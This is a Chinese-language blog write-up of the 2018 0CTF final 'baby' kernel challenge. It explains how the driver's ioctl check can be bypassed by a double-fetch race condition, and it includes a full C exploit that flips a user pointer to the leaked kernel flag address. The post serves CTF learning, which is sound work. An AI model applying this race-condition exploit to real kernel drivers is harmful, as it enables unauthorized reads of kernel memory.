---
layout: post
tags: [kernel_pwn]
title: "2018-0CTF-final baby 复现(race condition & double fetch)"
author: wsxk
date: 2022-11-2
comments: true
---

- [题目分析](#题目分析)
- [攻击思路 double fetch](#攻击思路-double-fetch)
- [exp](#exp)
- [references](#references)



## 题目分析<br>
首先查看一下启动脚本<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-6-27-DNS/20221102141735.png)
我们可以惊奇地发现，什么保护都没开（好耶！)<br>
再看看那个驱动的保护：
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-6-27-DNS/20221102141856.png)
发现也什么都没开。<br>
接下来分析一下代码：
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-6-27-DNS/20221102142025.png)<br>
ioctl函数提供了2个接口:<br>
一个是0x6666，它将会打印出flag的地址（内核）<br>
另一个是0x1337，这个功能首先`check`用户的输入（input_addr)是否合法。<br>
其中需要重点理解的有`_chk_range_not_ok`函数:
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-6-27-DNS/20221102143130.png)
这个函数首先将`第一个参数和第二个参数相加，判断是否发送进位（CF）`，再判断`第一个参数和第二个参数相加是否大于第三个参数`<br>
**2个条件必须同时满足才能通过检测**<br>
这里的第三个参数`*(_QWORD *)(__readgsqword((unsigned int)&current_task) + 4952)`看起来很复杂，仔细看，首先是`__readgsqword((unsigned int)&current_task)`,从函数名称可以看出这是读取以gs寄存器为基址索引的8个字节，偏移为`(unsigned int)&current_task`，其实就是读取了current_task在内核中的地址，然后以8字节为单位找到偏移为`4952`的值<br>
这里值得一提的是，我们还是不知道这个值是多少，需要调试去看一下。<br>
***注意，要想调试需要root权限，需要在init脚本里把 1000 改成 0，然后在启动脚本（start.sh)里添加-s选项***<br>
这里一般情况是没办法调试的
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-6-27-DNS/20221102150043.png)
因为不知为何，地址变成了奇奇怪怪的东西（，这就说明 使用 add-symbol-file添加符号不可行。<br>
因此需要用root权限来 `lsmod` 
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-6-27-DNS/20221102150144.png)
可以看到真正的驱动基地址。<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-6-27-DNS/20221102150212.png)
顺道一提，我惊奇的发现，基地址刚刚好就是check函数的地址，哈哈，也不用算偏移了。<br>
调试后发现，该值是 `0x7ffffffff000`
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-6-27-DNS/20221102150258.png)
刚刚好是栈底(<br>
从这个题目中，没有栈/堆的问题，似乎只是要我们猜flag<br>

## 攻击思路 double fetch<br>
我们可以利用 竞态条件（race condition）来绕过检测。<br>
`double fetch` 就是其中的一种。<br>
`double fetch`发送在以下条件：<br>
> 1. 用户往内核传送数据是以指针方式传送（意味着用户可以修改其所指向的内容）
> 2. 内核需要多次使用该指针来取值。

**double fetch直译就是取值2次**<br>
这次题目就满足了上述2个条件。<br>
double fetch正常情况图:
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-6-27-DNS/QQ%E5%9B%BE%E7%89%8720221102152018.jpg)<br>
attack后:
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-6-27-DNS/IMG_20221102_152239.jpg)<br>
说白了，`就是在一开始输入时，输入的参数是符合规范的`，在越过检测后，`修改参数为恶意地址`<br>
说的容易，其实我们没办法准确定位到第一次fetch和第二次fetch的时间，因此通常都采用爆破的手段。<br>

## exp<br>
```c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>

struct request{
    size_t addr;
    size_t length;
};
pthread_t compete;
struct request input;
size_t flag_addr;
size_t competition_times = 0x100;
char flag[0x100];
int result_fd;
int success=0;

void * race_thread(void){
    while(!success){
        for(int i=0;i<competition_times;i++){
            input.addr=flag_addr;
        }
    }
}

int main(){
    int fd = open("/dev/baby",O_RDWR);
    if(fd<0){
        printf("error in open /dev/baby!\n");
    }
    
    //get flag addr
    ioctl(fd,0x6666,&input);
    system("dmesg | grep flag > 1.txt");
    int file_fd = open("/1.txt",O_RDONLY);
    char buf[0x100];
    read(file_fd,buf,0x100);
    char * flag_start = strstr(buf,"Your flag is at ")+strlen("Your flag is at ");
    char * flag_end = flag_start + 16;
    flag_addr = strtoull(flag_start,flag_end,16);
    printf("flag_addr:%p\n",flag_addr);
    
    //init input
    input.addr = buf;
    input.length = 33;

    //create thread
    pthread_create(&compete,NULL,race_thread,NULL);

    //start race condition!
    while(!success){
        for(int i=0;i<competition_times;i++){
            input.addr=buf;
            input.length=33;
            ioctl(fd,0x1337,&input);
            system("dmesg | grep flag > result.txt");
            result_fd = open("/result.txt",O_RDONLY);
            read(result_fd,flag,0x100);
            if(strstr(flag,"Looks like the flag is not a secret anymore.")){
                printf("get flag!\n");
                success=1;
                break;
            }
        }
    }

    // close thread
    pthread_cancel(compete);
    
}
```

## references<br>
[https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#Off-by-One](https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#Off-by-One)<br>



<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-C22S5YSYL7');
</script>